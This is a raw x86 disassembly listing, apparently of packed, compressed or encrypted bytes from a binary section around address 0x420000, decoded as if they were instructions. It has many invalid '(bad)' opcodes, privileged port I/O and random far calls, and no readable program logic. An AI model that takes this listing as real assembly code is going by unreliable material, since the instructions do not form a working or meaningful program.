  4200cd:	aam    0xff
  4200cf:	adc    DWORD PTR [ebx],0xffffffe9
  4200d2:	push   0xa5f01a63
  4200d7:	(bad)  
  4200d8:	jnp    0x42006a
  4200da:	fwait
  4200db:	sbb    esi,DWORD PTR [esi-0x15]
  4200de:	push   ds
  4200df:	gs (bad) 
  4200e1:	leave  
  4200e2:	dec    ebp
  4200e3:	cld    
  4200e4:	or     BYTE PTR [edi-0x42b57f12],dl
  4200ea:	lods   al,BYTE PTR ds:[esi]
  4200eb:	sbb    bh,cl
  4200ed:	sub    BYTE PTR [ebp-0x5],cl
  4200f0:	mov    ds:0x646e064a,eax
  4200f5:	fsubr  DWORD PTR [eax+eiz*8-0x23]
  4200f9:	leave  
  4200fa:	out    dx,eax
  4200fb:	push   edx
  4200fc:	sti    
  4200fd:	mov    bh,0xc3
  4200ff:	fsubrp st(7),st
  420101:	lock out 0x90,eax
  420104:	mov    WORD PTR [edx-0x70],cs
  420107:	jg     0x4200af
  420109:	xchg   BYTE PTR [ebx],ah
  42010b:	xor    dh,BYTE PTR [edx]
  42010d:	daa    
  42010e:	daa    
  42010f:	inc    edx
  420110:	add    al,0x36
  420112:	iret   
  420113:	test   eax,0x697db1d2
  420118:	xchg   ebx,eax
  420119:	das    
  42011a:	add    ah,bl
  42011c:	retf   0xac70
  42011f:	mov    dl,0x84
  420121:	ins    BYTE PTR es:[edi],dx
  420122:	mov    al,ds:0xf113bf49
  420127:	cmp    DWORD PTR [ecx+0x3a1189b9],eax
  42012d:	ss mov dl,0x6b
  420130:	nop
  420131:	ins    DWORD PTR es:[edi],dx
  420132:	(bad)  
  420133:	shr    DWORD PTR [esi-0x22384ec0],cl
  420139:	push   ebp
  42013a:	add    eax,0xcf4eb6df
  42013f:	mov    BYTE PTR [ebp+0x1ae848e3],0x14
  420146:	and    BYTE PTR [ecx],bl
  420148:	into   
  420149:	xchg   DWORD PTR [edx-0x79],ecx
  42014c:	pop    es
  42014d:	add    eax,0x7d19d15b
  420152:	mov    ?,WORD PTR [edi+0x75]
  420155:	aas    
  420156:	pop    edx
  420157:	int3   
  420158:	mov    dh,0x6b
  42015a:	xor    al,0x47
  42015c:	or     BYTE PTR [ecx+ecx*8-0x71],0x9c
  420161:	test   BYTE PTR ds:[eax],dh
  420164:	bound  esi,QWORD PTR [ecx+0x71]
  420167:	add    BYTE PTR [ebx],al
  420169:	lds    eax,FWORD PTR [ebx+edx*4]
  42016c:	cdq    
  42016d:	rcl    DWORD PTR [edi+0x28],1
  420170:	retf   0x8d4e
  420173:	(bad)  
  420174:	out    0x85,eax
  420176:	mov    eax,ds:0xb8b708ca
  42017b:	dec    esi
  42017c:	sbb    cl,BYTE PTR [ebx]
  42017e:	cwde   
  42017f:	xchg   edi,eax
  420180:	adc    ebp,DWORD PTR [esp+ecx*2]
  420183:	call   FWORD PTR [edx+0x57]
  420186:	ss pop ecx
  420188:	add    BYTE PTR [eax],al
  42018a:	pop    ecx
  42018b:	push   edi
  42018c:	inc    ecx
  42018d:	dec    ebx
  42018e:	dec    edi
  42018f:	pop    edi
  420190:	pop    ebx
  420191:	push   edi
  420192:	sub    al,0x52
  420194:	xchg   DWORD PTR [ebx+0x75],esi
  420197:	lods   al,BYTE PTR ds:[esi]
  420199:	mov    esp,edx
  42019b:	nop
  42019c:	add    DWORD PTR [eax],eax
  42019e:	xchg   BYTE PTR [esi],al
  4201a0:	add    BYTE PTR [eax],al
  4201a2:	pushf  
  4201a3:	mov    WORD PTR [eax+0x22634171],ss
  4201a9:	sub    bh,BYTE PTR ds:0x5aa1affa
  4201af:	and    dh,BYTE PTR [edi+edi*4-0x7b19be1f]
  4201b6:	das    
  4201b7:	fs lock mov ebp,0x2e0baa90
  4201be:	or     bh,BYTE PTR [edi-0x7a8ceb8b]
  4201c4:	mov    esp,0x1e3d65ca
  4201c9:	in     al,0x93
  4201cb:	jge    0x4201d9
  4201cd:	(bad)  
  4201ce:	mov    esp,0xa0b5869f
  4201d3:	pop    esp
  4201d4:	xlat   BYTE PTR ds:[ebx]
  4201d5:	jle    0x42024f
  4201d7:	mov    ch,0x24
  4201d9:	int3   
  4201da:	add    eax,0xd4965bca
  4201df:	fcmove st,st(3)
  4201e1:	pop    ss
  4201e2:	mov    eax,ds:0x2185ac00
  4201e7:	loop   0x42018f
  4201e9:	jne    0x4201ab
  4201eb:	xchg   edx,eax
  4201ec:	xchg   edx,eax
  4201ed:	mov    eax,0xdbdbc5bb
  4201f2:	xchg   BYTE PTR [esi+0x54],al
  4201f5:	data16 or bh,BYTE PTR [eiz*8-0x7326a36e]
  4201fd:	dec    ebp
  4201fe:	cmp    al,0x93
  420200:	or     al,0xf9
  420202:	push   eax
  420203:	pop    ss
  420204:	mov    ds:0x927a824f,eax
  420209:	gs inc eax
  42020b:	fnstsw WORD PTR [esi-0x7950e273]
  420211:	inc    esi
  420212:	inc    eax
  420213:	jne    0x420251
  420215:	sub    BYTE PTR [ecx-0x6be5e721],dh
  42021b:	sahf   
  42021c:	(bad)
  42021f:	sbb    eax,0x9b52b30e
  420224:	jecxz  0x420224
  420226:	xor    eax,ebp
  420228:	stos   DWORD PTR es:[edi],eax
  420229:	inc    eax
  42022a:	inc    esp
  42022b:	lods   al,BYTE PTR ds:[esi]
  42022c:	repz pop eax
  42022e:	adc    ah,BYTE PTR [edi+0x39221f3f]
  420234:	pop    esi
  420235:	jmp    DWORD PTR [esi+edx*2]
  420238:	pop    ds
  420239:	ror    esi,cl
  42023b:	hlt    
  42023c:	enter  0x6736,0xd5
  420240:	call   0xd59a:0xa3af7065
  420247:	repz fwait
  420249:	(bad)  
  42024a:	loope  0x420283
  42024c:	out    dx,eax
  42024d:	add    eax,0x7f19b5a2
  420252:	jge    0x4202cf
  420254:	dec    edi
  420255:	or     esi,DWORD PTR [esi+ecx*4+0x31cb7f0f]
  42025c:	lock and eax,0x5c31307
  420262:	je     0x4202be
  420264:	jp     0x42026a
  420266:	pop    ds
  420267:	call   0x12b9b5d4
  42026c:	jg     0x4201f1
  42026e:	push   eax
  42026f:	inc    esp
  420270:	push   ss
  420271:	xchg   BYTE PTR [esi],bl
  420273:	call   0x72066e4
  420278:	mov    esi,0xb441eb40
  42027d:	and    BYTE PTR [eax+eiz*1-0x6e035546],bh
  420284:	je     0x420295
  420286:	je     0x420236
  420288:	hlt    
  420289:	sub    edx,DWORD PTR [ecx*8+0x51bf2dcf]
  420290:	mov    edi,0xc75e130d
  420295:	push   es
  420296:	jmp    0x4202fc
  420298:	mul    BYTE PTR [ecx+0x29]
  42029b:	mov    ebp,0x7d118dca
  4202a0:	fisttp WORD PTR [esi+eax*4]
  4202a3:	push   edi
  4202a4:	(bad)  
  4202a6:	arpl   si,bp
  4202a8:	scas   al,BYTE PTR es:[edi]
  4202a9:	pop    ecx
  4202aa:	call   0xad0df71
  4202af:	sub    eax,0xc239f89a
  4202b4:	xor    eax,0x9c3a23ed
  4202b9:	in     eax,0x69
  4202bb:	and    al,dh
  4202bd:	push   esp
  4202be:	test   eax,0xb7b13892
  4202c3:	pop    eax
  4202c4:	jb     0x4202b0
  4202c6:	call   0x282b:0xfc6552d1
  4202cd:	les    edi,FWORD PTR [esp+edi*4]
  4202d0:	out    dx,eax
  4202d1:	fisttp DWORD PTR [eax+0xa92ee95]
  4202d7:	ja     0x420322
  4202d9:	push   0x77
  4202db:	mov    ebp,0x6d146ed9
  4202e0:	cmp    esi,DWORD PTR [esi-0x29]
  4202e3:	add    al,0xf0
  4202e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202e6:	(bad)  
  4202e8:	mov    bl,0xbf
  4202ea:	inc    edi
  4202eb:	or     BYTE PTR [ebx],0xb8
  4202ee:	mov    ds:0x3f2aa46b,al
  4202f3:	and    bh,BYTE PTR [ebx+0x56]
  4202f6:	sub    esp,DWORD PTR [edi+0x1943ab39]
  4202fc:	cmp    BYTE PTR [ecx+0x15],al
  4202ff:	fisubr WORD PTR [eax+0x3f]
  420302:	mov    al,0x2e
  420304:	lods   eax,DWORD PTR ds:[esi]
  420305:	(bad)  
  420306:	aam    0xd3
  420308:	sbb    edi,DWORD PTR [ebx]
  42030a:	shl    cl,1
  42030c:	xchg   ebx,eax
  42030d:	inc    ebx
  42030e:	cmp    cl,BYTE PTR [ebp+0x32]
  420311:	push   esi
  420312:	fcmovb st,st(7)
  420314:	xor    dh,cl
  420316:	sbb    BYTE PTR [edi-0x3c],dl
  420319:	sbb    BYTE PTR [esi+ebp*1],0xc7
  42031d:	xchg   ecx,eax
  42031e:	cmc    
  42031f:	retf   
  420320:	call   0x74e19a35
  420325:	mov    dl,0x92
  420327:	aam    0x4
  420329:	sub    BYTE PTR [edx-0x7d],0xd
  42032d:	inc    BYTE PTR [eax+0x5f374eff]
  420333:	mov    ds:0xa76e63ee,al
  420338:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420339:	or     ebx,edx
  42033b:	call   0xb860d9bd
  420340:	dec    edi
  420341:	inc    edx
  420342:	lahf   
  420343:	dec    edx
  420344:	or     esi,edx
  420346:	repnz cli 
  420348:	out    0xc6,eax
  42034a:	dec    edx
  42034b:	adc    BYTE PTR [esi+0x24997994],0x1c
  420352:	test   al,0x9d
  420354:	lds    ebp,FWORD PTR [ebx]
  420356:	mov    al,ds:0xc52a9bcd
  42035b:	mov    al,ds:0x5c88ad97
  420360:	sahf   
  420361:	mov    BYTE PTR [ecx+ebx*4-0x23cc2477],bh
  420368:	cld    
  420369:	mov    bh,0x65
  42036b:	iret   
  42036c:	dec    edx
  42036d:	xor    ebp,DWORD PTR [edx+esi*1+0x52]
  420371:	loop   0x4202f9
  420373:	das    
  420374:	mov    ecx,0x8d4baef0
  420379:	mov    edi,ebx
  42037b:	lods   al,BYTE PTR ds:[esi]
  42037c:	js     0x4203e6
  42037e:	outs   dx,BYTE PTR ds:[esi]
  42037f:	dec    esp
  420380:	out    0xf2,eax
  420382:	push   edx
  420383:	in     al,0xaf
  420385:	repz jmp 0x4203df
  420388:	mov    ah,0xd6
  42038a:	push   ds
  42038b:	in     al,0x91
  42038d:	sbb    BYTE PTR [eax],dl
  42038f:	jae    0x420354
  420391:	sar    DWORD PTR [ecx+0x1e],0xfe
  420395:	jbe    0x42033b
  420397:	addr16 push esp
  420399:	repz add al,0x0
  42039c:	out    dx,eax
  42039d:	out    0xad,eax
  42039f:	mov    BYTE PTR [ebp+0x7c],dl
  4203a2:	mov    eax,ds:0x355ad34a
  4203a7:	retf   0x37f0
  4203aa:	imul   edi,DWORD PTR [ebp-0x4c],0x7b
  4203ae:	je     0x4203b2
  4203b0:	dec    esp
  4203b1:	xchg   edi,eax
  4203b2:	adc    bl,BYTE PTR [edi]
  4203b4:	push   0x5cf57cad
  4203b9:	out    dx,al
  4203ba:	pop    esp
  4203bb:	fnstcw WORD PTR ss:[esi-0x56]
  4203bf:	push   esp
  4203c0:	inc    edx
  4203c1:	mov    ebp,0x62644ec1
  4203c6:	mov    al,ds:0x2ccdad27
  4203cb:	ins    BYTE PTR es:[edi],dx
  4203cc:	dec    edi
  4203cd:	jb     0x42035d
  4203cf:	test   ebx,ebp
  4203d1:	inc    DWORD PTR [edx+0x65]
  4203d4:	mov    edx,0xf8327fee
  4203d9:	mov    ah,0x71
  4203db:	push   edx
  4203dc:	mov    ebx,0x9c2943cb
  4203e1:	ret    
  4203e2:	xchg   edx,eax
  4203e3:	loope  0x4203f4
  4203e5:	repnz inc esp
  4203e7:	cmp    al,0x4f
  4203e9:	and    ebx,ecx
  4203eb:	(bad)  
  4203ec:	pop    esp
  4203ed:	int    0xf4
  4203ef:	xlat   BYTE PTR ds:[ebx]
  4203f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203f1:	adc    al,0xb6
  4203f3:	inc    ebp
  4203f4:	fsub   QWORD PTR [ebx+ebp*2-0x5559703b]
  4203fb:	push   0xffffffb9
  4203fd:	test   eax,0x7ffcb659
  420402:	mov    ds:0x7acc73fd,al
  420407:	fist   DWORD PTR [eiz*1+0x7386200]
  42040e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42040f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420410:	xor    al,0x61
  420412:	out    0x44,al
  420414:	adc    ch,al
  420416:	sub    ebx,DWORD PTR ds:0x9df012bb
  42041c:	sbb    edi,ecx
  42041e:	clc    
  42041f:	dec    eax
  420420:	sahf   
  420421:	lods   eax,DWORD PTR ds:[esi]
  420422:	(bad)  
  420425:	xlat   BYTE PTR ds:[ebx]
  420426:	inc    eax
  420427:	cmp    ch,ah
  420429:	jl     0x4203f9
  42042b:	and    DWORD PTR [esi-0x7e],ebx
  42042e:	and    BYTE PTR [ecx+0x5c],al
  420431:	cwde   
  420432:	repz (bad) 
  420434:	jg     0x4203f3
  420436:	adc    DWORD PTR [edx-0x759ecfc2],esp
  42043c:	dec    esi
  42043d:	xchg   edi,eax
  42043e:	test   al,0x4c
  420440:	and    DWORD PTR [eax],ecx
  420442:	mov    ebp,0xe344173b
  420447:	ss mov bh,al
  42044a:	push   ecx
  42044b:	dec    ebx
  42044c:	mov    al,ds:0x46f79815
  420451:	dec    esi
  420452:	or     BYTE PTR [ecx+0x1],0x2f
  420456:	stos   BYTE PTR es:[edi],al
  420457:	inc    ebp
  420458:	jo     0x42049f
  42045a:	fcom   QWORD PTR [ebx+0x3dc9416a]
  420460:	xchg   esp,eax
  420461:	pop    ebx
  420462:	push   ecx
  420463:	mov    ebp,0x74fc8c30
  420468:	cli    
  420469:	movd   mm5,DWORD PTR [edi+0x62]
  42046d:	enter  0xb72e,0x58
  420471:	inc    ebx
  420472:	mov    edx,0x2f2e42f3
  420477:	mov    edx,0xf3c1d9a8
  42047c:	cld    
  42047d:	and    bh,BYTE PTR [eax+0x76b150b0]
  420483:	xor    ecx,edi
  420485:	repz fsub DWORD PTR [edx]
  420488:	add    bh,BYTE PTR [edi]
  42048a:	xchg   BYTE PTR [ebx],dh
  42048c:	xchg   ebp,eax
  42048d:	xchg   esi,edi
  42048f:	stc    
  420490:	adc    al,0xf2
  420492:	cli    
  420493:	and    eax,0x997255bf
  420498:	pop    edx
  420499:	mov    ecx,DWORD PTR ds:0xa7cb3d5f
  42049f:	push   0x24
  4204a1:	mov    ebx,ebp
  4204a3:	mov    eax,ds:0x820f7c6f
  4204a8:	adc    dh,BYTE PTR [eax]
  4204aa:	mov    edx,0x263470c0
  4204af:	jns    0x4204a1
  4204b1:	js     0x4204d8
  4204b3:	mov    ds:0xa1325a79,al
  4204b8:	loop   0x42044c
  4204ba:	and    BYTE PTR [ebp-0x5],0x42
  4204be:	data16 neg BYTE PTR [esp+ebp*1]
  4204c2:	ret    
  4204c3:	sbb    al,al
  4204c5:	arpl   WORD PTR [ecx+0xcfc42c2],si
  4204cb:	dec    ebp
  4204cc:	xchg   ebp,eax
  4204cd:	cwde   
  4204ce:	jnp    0x4204d0
  4204d0:	adc    edx,DWORD PTR [ebp-0x4c]
  4204d3:	addr16 jne 0x4204ab
  4204d6:	in     eax,0x5d
  4204d8:	mov    ?,esi
  4204da:	in     al,0x8
  4204dc:	sahf   
  4204dd:	xchg   ebx,eax
  4204de:	push   0xe
  4204e0:	mov    DWORD PTR ds:0x93863750,edi
  4204e6:	js     0x42052f
  4204e8:	(bad)  
  4204ea:	rcr    DWORD PTR [edi+ecx*2-0x54],0xc6
  4204ef:	jb     0x4204f9
  4204f1:	in     al,0x94
  4204f3:	add    BYTE PTR [eax+0x3f],0x31
  4204f7:	dec    ebp
  4204f8:	mov    cl,0x3
  4204fa:	cmc    
  4204fb:	dec    ebx
  4204fc:	mov    ch,0xaa
  4204fe:	gs leave 
  420500:	mov    al,ds:0xeb1c8a08
  420505:	mov    eax,0x9259a384
  42050a:	push   ds
  42050b:	mov    ecx,0x7041a4e7
  420510:	sbb    BYTE PTR [esi],bl
  420512:	mov    WORD PTR [esi-0x63e642b4],ds
  420518:	pop    es
  420519:	lods   eax,DWORD PTR ds:[si]
  42051b:	sub    ch,BYTE PTR [eax-0x9898929]
  420521:	sub    ch,BYTE PTR [ebx]
  420523:	inc    eax
  420524:	ins    BYTE PTR es:[edi],dx
  420525:	cmp    eax,0xab7190f7
  42052a:	jne    0x4204c4
  42052c:	xchg   esp,eax
  42052d:	inc    eax
  42052e:	xchg   ebp,eax
  42052f:	bound  esi,QWORD PTR [esi+edx*8-0xf]
  420533:	cmp    al,0x25
  420535:	mov    ah,0x73
  420537:	pop    ds
  420538:	sti    
  420539:	js     0x4205b2
  42053b:	xor    DWORD PTR [ebx+eax*4+0x512030c1],esi
  420542:	sbb    BYTE PTR ds:0xc6c64ab5,ch
  420548:	adc    al,0x7
  42054a:	dec    ecx
  42054b:	test   BYTE PTR [ebx+0x3c],ch
  42054e:	jmp    0x556b:0x653dfd9e
  420555:	hlt    
  420556:	fisubr DWORD PTR [ecx]
  420558:	and    esi,ebp
  42055a:	dec    esp
  42055b:	stos   BYTE PTR es:[edi],al
  42055c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42055d:	fbld   TBYTE PTR [eax]
  42055f:	push   ebx
  420560:	push   ds
  420561:	stc    
  420562:	cmp    BYTE PTR [eax+0x61],0xd0
  420566:	and    BYTE PTR fs:[ebp+0x3d],ch
  42056a:	cmp    BYTE PTR [edx],0x58
  42056d:	cs aad 0x46
  420570:	add    ch,BYTE PTR [ecx+0x6f]
  420573:	push   cs
  420574:	outs   dx,BYTE PTR ds:[esi]
  420575:	or     al,0x98
  420577:	paddq  mm4,QWORD PTR [eax-0x556fd6f3]
  42057e:	stos   DWORD PTR es:[edi],eax
  42057f:	(bad)  
  420580:	pop    eax
  420581:	sub    al,0x41
  420583:	shr    DWORD PTR [edx],1
  420585:	pop    ecx
  420586:	or     al,0x1d
  420588:	pop    esp
  420589:	int3   
  42058a:	ss (bad) 
  42058c:	mov    al,ds:0xdb556808
  420591:	loopne 0x420556
  420593:	jo     0x42059c
  420595:	sbb    BYTE PTR [ebx],dl
  420597:	sbb    ch,BYTE PTR [eax]
  420599:	jno    0x42058f
  42059b:	and    edx,ebx
  42059d:	xchg   esp,eax
  42059e:	shl    BYTE PTR [edx],cl
  4205a0:	mov    ecx,0xfb4f1e5b
  4205a5:	rol    BYTE PTR [esi],cl
  4205a7:	in     al,0x9b
  4205a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205aa:	cmp    dl,cl
  4205ac:	mov    dl,0xa5
  4205ae:	pop    ecx
  4205af:	fisttp WORD PTR [ebx-0x29]
  4205b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205b3:	mov    dh,ch
  4205b5:	pop    es
  4205b6:	pop    ebp
  4205b7:	cs (bad) 
  4205ba:	adc    ebx,esi
  4205bc:	push   edx
  4205bd:	and    eax,0x80be4c04
  4205c2:	scas   al,BYTE PTR es:[edi]
  4205c3:	test   al,0x9f
  4205c5:	mov    bl,0x2e
  4205c7:	lahf   
  4205c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205c9:	and    bl,BYTE PTR [ebx]
  4205cb:	pop    edx
  4205cc:	mov    al,0x22
  4205ce:	daa    
  4205cf:	xchg   esp,eax
  4205d0:	inc    eax
  4205d1:	cmc    
  4205d2:	outs   dx,DWORD PTR ds:[esi]
  4205d3:	in     eax,dx
  4205d4:	and    ch,BYTE PTR [ebp+0x2]
  4205d7:	inc    esp
  4205d8:	pop    DWORD PTR [ebx+0x77]
  4205db:	and    al,0x2f
  4205dd:	cmp    DWORD PTR [ecx-0x2a2fc575],ebp
  4205e3:	not    BYTE PTR [edx-0x50964e73]
  4205e9:	sbb    al,0x8a
  4205eb:	stc    
  4205ec:	bound  edi,QWORD PTR [ebx]
  4205ee:	in     al,dx
  4205ef:	mov    ecx,ecx
  4205f1:	es sub al,0x26
  4205f4:	push   ecx
  4205f5:	mov    al,BYTE PTR [edx+0x457bc418]
  4205fb:	xchg   BYTE PTR [edi+ebp*2-0x4e],al
  4205ff:	dec    edi
  420600:	sbb    eax,0xb12b0328
  420605:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420606:	fdiv   st(7),st
  420608:	(bad)  
  420609:	push   ebp
  42060a:	adc    al,0xe5
  42060c:	cmp    DWORD PTR [edi+eiz*4],edx
  42060f:	fwait
  420610:	fwait
  420611:	push   edi
  420612:	sbb    BYTE PTR [eax+0x19],al
  420615:	push   esp
  420616:	dec    ecx
  420617:	lahf   
  420618:	sbb    bh,BYTE PTR [edi]
  42061a:	mov    al,ds:0x6b922507
  42061f:	xchg   esp,eax
  420620:	dec    eax
  420621:	cdq    
  420622:	(bad)  
  420623:	sar    al,0xe9
  420626:	loopne 0x420685
  420628:	popf   
  420629:	lea    edx,[esi+0x56b5b54c]
  42062f:	pop    es
  420630:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420631:	xlat   BYTE PTR ds:[ebx]
  420632:	or     al,BYTE PTR [edi+0x6e]
  420635:	retf   0xb6e0
  420638:	cs and ebp,edx
  42063b:	jne    0x420632
  42063d:	inc    ebp
  42063e:	into   
  42063f:	out    dx,al
  420640:	xor    cl,BYTE PTR [eax-0x1a46a845]
  420646:	fisub  WORD PTR es:[edi]
  420649:	popf   
  42064a:	sub    DWORD PTR [ecx],edx
  42064c:	mov    ah,0x84
  42064e:	lock les ebx,FWORD PTR [esi]
  420651:	cmp    ebp,ebp
  420653:	xchg   BYTE PTR [ebx+esi*1],cl
  420656:	jle    0x42060a
  420658:	cmp    al,0xfa
  42065a:	mov    bl,0x2b
  42065c:	xor    al,0xb4
  42065e:	mov    esi,DWORD PTR [esi]
  420660:	mov    bh,0xc0
  420662:	pop    esp
  420663:	add    BYTE PTR [ebx+edx*1+0x35],dh
  420667:	push   0x6a
  420669:	lods   eax,DWORD PTR ds:[esi]
  42066a:	(bad)  
  42066c:	stos   BYTE PTR es:[edi],al
  42066d:	call   0x10f4:0x8ff22ab7
  420674:	gs scas eax,DWORD PTR es:[edi]
  420676:	push   edi
  420677:	rol    edx,1
  420679:	dec    eax
  42067a:	push   0x22ce37e7
  42067f:	adc    ebp,DWORD PTR [edx+0x77]
  420682:	xor    BYTE PTR [eax+eax*2-0x5c28d1af],ah
  420689:	loopne 0x4206e8
  42068b:	fs adc dh,bl
  42068e:	fstp   TBYTE PTR [edi+0x516184e2]
  420694:	sub    al,0x14
  420696:	pop    es
  420697:	lods   al,BYTE PTR ds:[esi]
  420698:	addr16 mov ds:0x8ab9,al
  42069c:	scas   eax,DWORD PTR es:[edi]
  42069d:	sub    ch,BYTE PTR [edx-0x7e]
  4206a0:	pop    edx
  4206a1:	adc    edi,ebx
  4206a3:	jp     0x420644
  4206a5:	mov    ah,0x41
  4206a7:	(bad)  
  4206a8:	aam    0x71
  4206aa:	push   esp
  4206ab:	pop    eax
  4206ac:	(bad)  
  4206ae:	pop    eax
  4206af:	mov    eax,0xb855df17
  4206b4:	test   DWORD PTR [ebx],ebp
  4206b6:	dec    edi
  4206b7:	cmp    al,0x74
  4206b9:	pusha  
  4206ba:	js     0x42067e
  4206bc:	xchg   ebx,eax
  4206bd:	mov    bl,0xb
  4206bf:	pop    ebx
  4206c0:	dec    ebx
  4206c1:	(bad)  
  4206c2:	retf   
  4206c3:	cs xchg ebx,eax
  4206c5:	mov    dl,0x6b
  4206c7:	push   edx
  4206c8:	xor    eax,0xe7e80f3b
  4206cd:	ins    DWORD PTR es:[edi],dx
  4206ce:	or     ah,BYTE PTR [edx-0x49]
  4206d1:	push   ebx
  4206d2:	retf   0x25df
  4206d5:	jbe    0x4206fa
  4206d7:	imul   esi,esp,0xffffffd7
  4206da:	stos   BYTE PTR es:[edi],al
  4206db:	xchg   ebp,eax
  4206dc:	xor    BYTE PTR [esi-0x28d6132e],0x1d
  4206e3:	push   eax
  4206e4:	call   0x8d7c:0x1b8bfe7a
  4206eb:	mov    dl,0x87
  4206ed:	jns    0x4206d9
  4206ef:	psubsb mm5,QWORD PTR [edi-0x2b]
  4206f3:	add    al,0xeb
  4206f5:	xchg   DWORD PTR [edi],esi
  4206f7:	popa   
  4206f8:	xchg   esi,eax
  4206f9:	fs mov eax,0x26db5122
  4206ff:	sbb    DWORD PTR [ebp-0x5b46c9d6],0x24738abf
  420709:	xchg   esi,eax
  42070a:	or     BYTE PTR [edx],bh
  42070c:	add    eax,0xf087780b
  420711:	jg     0x4206b7
  420713:	and    cl,0x2
  420716:	xor    eax,0x3c75f6be
  42071b:	shr    BYTE PTR [ecx+0x75],0xe5
  42071f:	mov    edx,0x4d56552d
  420724:	cli    
  420725:	inc    ebx
  420726:	adc    DWORD PTR [ecx+0xc],eax
  420729:	sbb    BYTE PTR [ecx+0x351f8ed7],0x85
  420730:	sub    bh,BYTE PTR [ebp-0x1ef21077]
  420736:	icebp  
  420737:	out    0xbf,eax
  420739:	fisttp QWORD PTR [esi]
  42073b:	jp     0x42072d
  42073d:	sbb    al,0x85
  42073f:	enter  0xf7c0,0x20
  420743:	leave  
  420744:	aaa    
  420745:	int    0xa4
  420747:	pop    ebx
  420748:	out    0x10,al
  42074a:	ror    DWORD PTR [ecx+0x346ed916],1
  420750:	test   eax,0xe8666148
  420755:	div    BYTE PTR [edx]
  420757:	shl    DWORD PTR [edx+ecx*2],0x2d
  42075b:	scas   eax,DWORD PTR es:[edi]
  42075c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42075d:	inc    ecx
  42075e:	dec    eax
  42075f:	ds dec eax
  420761:	std    
  420762:	xlat   BYTE PTR ds:[ebx]
  420763:	aaa    
  420764:	or     BYTE PTR ds:0xb70b2fc8,0x18
  42076b:	add    esi,DWORD PTR [ebx-0x2f0af306]
  420771:	jno    0x4207ba
  420773:	mov    edx,0x6b6e6c7
  420778:	mov    al,ds:0x28d02367
  42077d:	cdq    
  42077e:	dec    edi
  42077f:	in     al,0x23
  420781:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420782:	aaa    
  420783:	or     al,0x18
  420785:	xchg   DWORD PTR [esi+edx*8-0x6371c2f9],esi
  42078c:	push   ebp
  42078d:	pop    es
  42078e:	adc    BYTE PTR [eax+0x78],bl
  420791:	repz shl DWORD PTR [edx],cl
  420794:	push   eax
  420795:	pusha  
  420796:	inc    esp
  420797:	dec    esi
  420798:	(bad)  
  420799:	xchg   esi,eax
  42079a:	in     eax,dx
  42079b:	cmp    ecx,DWORD PTR [eax]
  42079d:	and    BYTE PTR [esp+ebx*4],cl
  4207a0:	inc    edx
  4207a1:	test   eax,0x66717073
  4207a6:	fcom   DWORD PTR [edi-0x32a3d07b]
  4207ac:	fiadd  WORD PTR [edx+0x1150a271]
  4207b2:	nop
  4207b3:	pop    esi
  4207b4:	mov    ds:0x5c848270,al
  4207b9:	cmc    
  4207ba:	xor    eax,0x7326119c
  4207bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207c0:	inc    ecx
  4207c1:	popf   
  4207c2:	shl    BYTE PTR [esi+0x6],cl
  4207c5:	xlat   BYTE PTR ds:[ebx]
  4207c6:	sti    
  4207c7:	add    eax,0x6222fba
  4207cc:	mov    eax,0xc64cfac1
  4207d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207d2:	(bad)  [edi-0x70]
  4207d5:	xor    DWORD PTR [edi-0x7d9f7293],0xffffffd8
  4207dc:	and    ch,BYTE PTR cs:[esi-0x52]
  4207e0:	mov    ebx,0x5e10a55f
  4207e5:	sub    esi,DWORD PTR [edx-0x28]
  4207e8:	mov    ch,0x79
  4207ea:	inc    edx
  4207eb:	jl     0x4207ca
  4207ed:	inc    ebx
  4207ee:	arpl   WORD PTR [ebp+0x22],di
  4207f1:	ins    BYTE PTR es:[edi],dx
  4207f2:	div    DWORD PTR [eax+0x3608e406]
  4207f8:	and    bl,bl
  4207fa:	call   0x911fde49
  4207ff:	sub    dh,BYTE PTR [esi+0x53e1fb3b]
  420805:	add    DWORD PTR [ebx],esi
  420807:	out    0x50,al
  420809:	loope  0x4207bb
  42080b:	sub    dh,BYTE PTR [edi]
  42080d:	(bad)
  420810:	dec    eax
  420811:	pusha  
  420812:	inc    ebp
  420813:	fwait
  420814:	ins    BYTE PTR es:[edi],dx
  420815:	xchg   edi,eax
  420816:	sbb    ebp,DWORD PTR [ebp+0x670924da]
  42081c:	pop    eax
  42081d:	mov    dh,0x41
  42081f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420820:	call   0x5829fecf
  420825:	sar    bl,1
  420827:	test   DWORD PTR [eax],0x4a4d4400
  42082d:	dec    ebx
  42082e:	dec    ebx
  42082f:	dec    edi
  420830:	inc    ebp
  420831:	dec    edi
  420832:	sub    eax,0x5a04921e
  420837:	ds or  eax,0x1976803
  42083d:	add    BYTE PTR [esi+0x20000006],al
  420843:	xchg   BYTE PTR [esi-0x74],bl
  420846:	ja     0x420849
  420848:	test   DWORD PTR [esi+0x4b],esp
  42084b:	enter  0x1432,0xa5
  42084f:	imul   ebx,edi,0x3e
  420852:	int3   
  420853:	xchg   DWORD PTR [edi],edx
  420855:	loopne 0x420806
  420857:	les    ebp,FWORD PTR [esi+0x6f]
  42085a:	jbe    0x42083a
  42085c:	repnz mov eax,ds:0xfaa945cc
  420862:	rcr    BYTE PTR [edx+esi*1-0x31],cl
  420866:	fs cdq 
  420868:	xor    eax,0x65510af2
  42086d:	jnp    0x42085a
  42086f:	inc    esi
  420870:	and    eax,0xb2c302c1
  420875:	in     al,0xcf
  420877:	je     0x42081a
  420879:	test   al,0x42
  42087b:	pop    es
  42087c:	jno    0x42081a
  42087e:	jns    0x420818
  420880:	xor    DWORD PTR [ecx],ebp
  420882:	pop    ss
